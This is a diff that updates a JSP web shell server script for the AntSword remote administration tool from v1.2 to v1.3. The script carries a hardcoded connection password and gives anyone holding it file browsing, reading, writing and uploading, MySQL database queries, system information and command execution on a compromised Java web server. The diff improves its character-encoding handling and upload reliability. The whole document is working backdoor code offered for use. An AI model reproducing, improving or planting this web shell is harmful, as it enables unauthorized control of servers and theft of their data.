@@ -21,8 +21,14 @@
     注意：以上是两行
  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 
+已知问题：
+ 1. 文件管理遇到中文文件名显示的问题
 ChangeLog:
-  Data: 2016/04/29 v1.2
+  v1.3
+   1. 修正上传文件超过1M时的bug
+   2. 修正weblogic war 包布署获取路径问题
+   3. 修正文件中文字符问题
+  Date: 2016/04/29 v1.2
    1. 修正修改包含结束tag的文件会出错的 bug
   Date: 2016/04/06 v1.1
    1. 修正下载文件参数设置错误
@@ -32,28 +38,31 @@ ChangeLog:
    2. mysql 数据库支持
    3. 支持 base64 和 hex 编码
 --%>
-<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
+<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*" contentType="text/html;charset=UTF-8"%>
 <%!
+// ################################################
     String Pwd = "ant";   //连接密码
     // 数据编码 3 选 1
-    String encoder = ""; // default
+    String encoder = "";       // default
     // String encoder = "base64"; //base64
-    // String encoder = "hex"; //hex
-    String cs = "UTF-8"; // 脚本自身编码
+    // String encoder = "hex";    //hex(推荐)
+    String cs = "UTF-8"; // 编码方式
+// ################################################
+
     String EC(String s) throws Exception {
         if(encoder.equals("hex") || encoder == "hex") return s;
-        return new String(s.getBytes("ISO-8859-1"), cs);
+        return new String(s.getBytes(), cs);
     }
 
     String showDatabases(String encode, String conn) throws Exception {
-        String sql = "show databases"; // mysql
+        String sql = "show databases";
         String columnsep = "\t";
         String rowsep = "";
         return executeSQL(encode, conn, sql, columnsep, rowsep, false);
     }
 
     String showTables(String encode, String conn, String dbname) throws Exception {
-        String sql = "show tables from " + dbname; // mysql
+        String sql = "show tables from " + dbname;
         String columnsep = "\t";
         String rowsep = "";
         return executeSQL(encode, conn, sql, columnsep, rowsep, false);
@@ -62,12 +71,12 @@ ChangeLog:
     String showColumns(String encode, String conn, String dbname, String table) throws Exception {
         String columnsep = "\t";
         String rowsep = "";
-        String sql = "select * from " + dbname + "." + table + " limit 0,0"; // mysql
+        String sql = "select * from " + dbname + "." + table + " limit 0,0";
         return executeSQL(encode, conn, sql, columnsep, rowsep, true);
     }
 
     String query(String encode, String conn, String sql) throws Exception {
-        String columnsep = "\t|\t"; // general
+        String columnsep = "\t|\t";
         String rowsep = "\r\n";
         return executeSQL(encode, conn, sql, columnsep, rowsep, true);
     }
@@ -102,8 +111,7 @@ ChangeLog:
         return ret;
     }
 
-    String WwwRootPathCode(HttpServletRequest r) throws Exception {
-        String d = r.getSession().getServletContext().getRealPath("/");
+    String WwwRootPathCode(String d) throws Exception {
         String s = "";
         if (!d.substring(0, 1).equals("/")) {
             File[] roots = File.listRoots();
@@ -120,24 +128,27 @@ ChangeLog:
         File oF = new File(dirPath), l[] = oF.listFiles();
         String s = "", sT, sQ, sF = "";
         java.util.Date dt;
+        String fileCode=(String)System.getProperties().get("file.encoding");
         SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
         for (int i = 0; i < l.length; i++) {
             dt = new java.util.Date(l[i].lastModified());
             sT = fm.format(dt);
             sQ = l[i].canRead() ? "R" : "";
             sQ += l[i].canWrite() ? " W" : "";
+            String nm = new String(l[i].getName().getBytes(fileCode), cs);
             if (l[i].isDirectory()) {
-                s += l[i].getName() + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
+                s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
             } else {
-                sF += l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
+                sF += nm + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
             }
         }
-        return s += sF;
+        s += sF;
+        return new String(s.getBytes(fileCode), cs);
     }
 
     String ReadFileCode(String filePath) throws Exception {
         String l = "", s = "";
-        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath))));
+        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath)), cs));
         while ((l = br.readLine()) != null) {
             s += l + "\r\n";
         }
@@ -146,9 +157,14 @@ ChangeLog:
     }
 
     String WriteFileCode(String filePath, String fileContext) throws Exception {
-        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(filePath))));
-        bw.write(fileContext);
-        bw.close();
+        String h = "0123456789ABCDEF";
+        String fileHexContext = strtohexstr(fileContext);
+        File f = new File(filePath);
+        FileOutputStream os = new FileOutputStream(f);
+        for (int i = 0; i < fileHexContext.length(); i += 2) {
+            os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
+        }
+        os.close();
         return "1";
     }
 
@@ -185,7 +201,7 @@ ChangeLog:
         String h = "0123456789ABCDEF";
         File f = new File(savefilePath);
         f.createNewFile();
-        FileOutputStream os = new FileOutputStream(f);
+        FileOutputStream os = new FileOutputStream(f,true);
         for (int i = 0; i < fileHexContext.length(); i += 2) {
             os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
         }
@@ -254,16 +270,27 @@ ChangeLog:
     }
 
     String SysInfoCode(HttpServletRequest r) throws Exception {
-        String d = r.getSession().getServletContext().getRealPath("/");
-        String serverInfo = System.getProperty("os.name");
+        String d = "";
+        try {
+            if(r.getSession().getServletContext().getRealPath("/") != null){
+                d = r.getSession().getServletContext().getRealPath("/");
+            }else{
+                String cd = this.getClass().getResource("/").getPath();
+                d = new File(cd).getParent();
+            }
+        } catch (Exception e) {
+            String cd = this.getClass().getResource("/").getPath();
+            d = new File(cd).getParent();
+        }
+        String serverInfo = (String)System.getProperty("os.name");
         String separator = File.separator;
-        String user = System.getProperty("user.name");
-        String driverlist = WwwRootPathCode(r);
+        String user = (String)System.getProperty("user.name");
+        String driverlist = WwwRootPathCode(d);
         return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
     }
 
     boolean isWin() {
-        String osname = System.getProperty("os.name");
+        String osname = (String)System.getProperty("os.name");
         osname = osname.toLowerCase();
         if (osname.startsWith("win"))
             return true;
@@ -278,6 +305,41 @@ ChangeLog:
         CopyInputStream(p.getErrorStream(), sb);
         return sb.toString();
     }
+    
+    String getEncoding(String str) {
+        String encode[] = new String[]{
+                "UTF-8",
+                "ISO-8859-1",
+                "GB2312",
+                "GBK",
+                "GB18030",
+                "Big5",
+                "Unicode",
+                "ASCII"
+        };
+        for (int i = 0; i < encode.length; i++){
+            try {
+                if (str.equals(new String(str.getBytes(encode[i]), encode[i]))) {
+                    return encode[i];
+                }
+            } catch (Exception ex) {
+            }
+        }
+        
+        return "";
+    }
+    String strtohexstr(String fileContext)throws Exception{
+        String h = "0123456789ABCDEF";
+        byte[] bytes = fileContext.getBytes(cs);
+        
+        StringBuilder sb = new StringBuilder(bytes.length * 2);
+        for (int i = 0; i < bytes.length; i++) {
+            sb.append(h.charAt((bytes[i] & 0xf0) >> 4));
+            sb.append(h.charAt((bytes[i] & 0x0f) >> 0));
+        }
+        String fileHexContext = sb.toString();
+        return fileHexContext;
+    }
 
     String decode(String str) {
         byte[] bt = null;
@@ -289,40 +351,32 @@ ChangeLog:
         }
         return new String(bt);
     }
-    String decode(String str, String encode){
+    String decode(String str, String encode) throws Exception{
         if(encode.equals("hex") || encode=="hex"){
             if(str=="null"||str.equals("null")){
                 return "";
             }
-            StringBuilder sb = new StringBuilder();
-            StringBuilder temp = new StringBuilder();
-            try{
-                for(int i=0; i<str.length()-1; i+=2 ){
-                    String output = str.substring(i, (i + 2));
-                    int decimal = Integer.parseInt(output, 16);
-                    sb.append((char)decimal);
-                    temp.append(decimal);
-                }
-            }catch(Exception e){
-                e.printStackTrace();
+            String hexString = "0123456789ABCDEF";
+            str = str.toUpperCase();
+            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);
+            String ss = "";
+            for (int i = 0; i < str.length(); i += 2){
+                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
+                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
             }
-            return sb.toString();
+            return baos.toString(cs);
         }else if(encode.equals("base64") || encode == "base64"){
             byte[] bt = null;
-            try {
-                sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
-                bt = decoder.decodeBuffer(str);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            return new String(bt);
+            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
+            bt = decoder.decodeBuffer(str);
+            return new String(bt,cs);
         }
         return str;
     }
 
     void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
         String l;
-        BufferedReader br = new BufferedReader(new InputStreamReader(is));
+        BufferedReader br = new BufferedReader(new InputStreamReader(is, cs));
         while ((l = br.readLine()) != null) {
             sb.append(l + "\r\n");
         }
@@ -330,6 +384,7 @@ ChangeLog:
     }%>
 <%
     response.setContentType("text/html");
+    request.setCharacterEncoding(cs);
     response.setCharacterEncoding(cs);
     StringBuffer sb = new StringBuffer("");
     try {
